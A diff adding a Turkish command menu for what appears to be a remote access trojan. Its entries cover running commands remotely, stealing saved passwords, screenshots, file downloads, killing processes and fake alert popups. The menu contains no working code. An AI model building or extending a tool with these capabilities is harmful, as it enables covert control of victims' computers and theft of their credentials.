@@ -1,0 +1,16 @@
+start - Açılış, Bilgi Alma
+komut - Komutları Listeler
+bip - 4 saniye çevirmeli bağlantı sesi
+cd - change directory
+cmd - [komut] çalıştırır
+data - kayıtlı şifreleri çalar
+ekran - screen shot
+hata - [metin] uyarı penceresi gönderir
+indir - [dosya] indirir
+islemler - aktif işlemleri listeler
+ls - geçerli dizini listeler
+oldur - [islem.exe] sonlandırır
+pwd - print working directory
+rmdir - remove directory
+sistem - sistem hakkında bilgi verir
+url - [url] chrome'da açtırır
